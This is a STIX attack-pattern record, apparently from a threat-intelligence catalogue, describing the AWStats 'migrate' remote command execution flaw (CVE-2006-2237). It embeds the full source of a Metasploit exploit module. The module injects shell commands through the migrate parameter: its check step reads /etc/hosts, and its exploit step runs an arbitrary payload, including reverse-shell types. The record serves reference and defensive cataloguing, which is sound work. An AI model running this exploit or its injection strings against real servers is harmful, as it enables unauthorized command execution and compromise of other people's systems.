{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--68fc78f1-6358-4a08-a41b-3fd2dca9fc57",
    "created": "2024-08-14T17:13:04.196993Z",
    "modified": "2024-08-14T17:13:04.196998Z",
    "name": "AWStats migrate Remote Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in the AWStats CGI script. AWStats v6.4 and v6.5 are vulnerable. Perl based payloads are recommended with this module. The vulnerability is only present when AllowToUpdateStatsFromBrowser is enabled in the AWStats configuration file (non-default). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/awstats_migrate_exec.rb",
            "external_id": "awstats_migrate_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-2237"
        },
        {
            "source_name": "reference",
            "url": "http://awstats.sourceforge.net/awstats_security_news.php"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AWStats migrate Remote Command Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary command execution vulnerability in the\n        AWStats CGI script. AWStats v6.4 and v6.5 are vulnerable. Perl based\n        payloads are recommended with this module. The vulnerability is only\n        present when AllowToUpdateStatsFromBrowser is enabled in the AWStats\n        configuration file (non-default).\n      },\n      'Author'         => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2006-2237'],\n          ['OSVDB', '25284'],\n          ['BID', '17844'],\n          ['URL', 'http://awstats.sourceforge.net/awstats_security_news.php'],\n          ['EDB', '1755'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 512,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl ruby python bash-tcp telnet',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2006-05-04',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"The full URI path to awstats.pl\", \"/cgi-bin/awstats.pl\"]),\n        OptString.new('AWSITE', [true, \"The AWStats config site name\", \"demo\"]),\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri'      => normalize_uri(datastore['URI']),\n      'vars_get' =>\n        {\n          'migrate' => \"|echo;cat /etc/hosts;echo|awstats#{Rex::Text.rand_text_numeric(6)}.#{datastore['AWSITE']}.txt\"\n        }\n      }, 25)\n\n    if (res and res.body.match(/localhost/))\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    command = Rex::Text.uri_encode(\"cd /tmp &&\" + payload.encoded)\n    sploit = normalize_uri(datastore['URI']) + \"?migrate=|echo;echo%20YYY;#{command};echo%20YYY;echo|awstats#{Rex::Text.rand_text_numeric(6)}.#{datastore['AWSITE']}.txt\"\n\n    res = send_request_raw({\n      'uri'     => sploit,\n      'method'  => 'GET',\n      'headers' =>\n        {\n          'Connection' => 'Close',\n        }\n      }, 25)\n\n    if (res)\n      print_status(\"The server returned: #{res.code} #{res.message}\")\n\n      m = res.body.match(/YYY\\n(.*)\\nYYY/m)\n\n      if (m)\n        print_status(\"Command output from the server:\")\n        print(\"\\n\" + m[1] + \"\\n\\n\")\n      else\n        print_status(\"This server may not be vulnerable\")\n      end\n    else\n      print_status(\"No response from the server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-05-04",
    "x_mitre_platforms": [
        "unix'"
    ]
}